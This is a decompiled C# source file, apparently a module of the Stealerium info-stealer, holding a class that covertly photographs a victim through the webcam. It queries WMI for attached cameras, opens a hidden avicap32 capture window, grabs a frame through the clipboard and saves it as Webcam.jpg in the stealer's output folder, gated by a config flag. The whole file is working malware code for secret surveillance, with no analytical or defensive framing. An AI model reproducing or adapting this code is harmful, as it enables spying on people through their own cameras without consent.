using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Target.System;

internal sealed class WebcamScreenshot
{
	private static IntPtr _handle;

	private static readonly int delay = 3000;

	[DllImport("avicap32.dll")]
	private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hwndParent, int nId);

	[DllImport("user32")]
	private static extern int SendMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

	public static int GetConnectedCamerasCount()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		int num = 0;
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						enumerator.get_Current();
						num++;
					}
					return num;
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			Logging.Log("GetConnectedCamerasCount : Query failed");
			return num;
		}
	}

	public static bool Make(string sSavePath)
	{
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		if (Config.WebcamScreenshot != "1")
		{
			return false;
		}
		int connectedCamerasCount = GetConnectedCamerasCount();
		if (connectedCamerasCount != 1)
		{
			return Logging.Log($"WebcamScreenshot : Camera screenshot failed. (Count {connectedCamerasCount})", ret: false);
		}
		try
		{
			Clipboard.Clear();
			_handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
			SendMessage(_handle, 1034u, 0, 0);
			SendMessage(_handle, 1074u, 0, 0);
			Thread.Sleep(delay);
			SendMessage(_handle, 1084u, 0, 0);
			SendMessage(_handle, 1054u, 0, 0);
			SendMessage(_handle, 1035u, 0, 0);
			IDataObject dataObject = Clipboard.GetDataObject();
			Image val = (Image)((dataObject != null) ? dataObject.GetData(DataFormats.Bitmap) : null);
			Clipboard.Clear();
			if (val != null)
			{
				val.Save(sSavePath + "\\Webcam.jpg", ImageFormat.get_Jpeg());
				val.Dispose();
			}
			Counter.WebcamScreenshot = true;
		}
		catch (Exception ex)
		{
			return Logging.Log("WebcamScreenshot : Camera screenshot failed.\n" + ex, ret: false);
		}
		return true;
	}
}
